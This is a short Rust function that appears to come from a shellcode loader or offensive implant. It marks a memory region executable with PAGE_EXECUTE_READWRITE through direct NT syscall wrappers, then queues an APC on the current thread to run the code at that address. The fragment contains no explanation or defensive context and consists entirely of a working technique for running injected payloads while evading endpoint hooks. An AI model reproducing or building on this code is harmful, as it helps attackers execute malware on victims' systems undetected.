#[allow(non_snake_case)]
pub unsafe fn exec(p: usize, size: usize) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via APC Syscall...");

    use crate::ntapi::PAGE_EXECUTE_READWRITE;
    crate::ntapi::protect_virtual_memory(-1, p, size, PAGE_EXECUTE_READWRITE)?;

    let current_thread_handle: isize = -2isize; // Pseudo-handle for current thread
    crate::ntapi::queue_apc_thread(current_thread_handle, p)?;
    Ok(())
}